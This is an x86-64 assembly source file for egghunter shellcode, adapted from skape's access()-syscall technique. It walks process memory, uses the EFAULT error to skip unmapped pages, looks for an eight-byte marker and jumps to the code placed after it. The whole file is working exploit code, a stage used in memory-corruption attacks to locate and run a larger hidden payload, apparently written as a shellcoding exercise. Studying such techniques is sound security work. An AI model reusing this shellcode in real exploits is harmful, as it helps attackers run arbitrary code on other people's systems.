BITS 64

global _start

;egg=mrtfegg\x23
EGG equ 0x236767656674726d

section .text
_start:
	;Egghunter shellcode
	;adapted from 32 bit access implementation here: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
	xor rsi,rsi
loop:
	;access syscall is 21
	push 0x15
	pop rax
	push rdx	
	pop rdi
	add rdx,0x8
	; make access system call
	syscall
	; EFAULT is bad page
	cmp al,0xf2
	;EFAULT, next address
	jz loop 
	mov rax, EGG
	cmp rax, [rdi]
	jnz loop
	jmp rdx


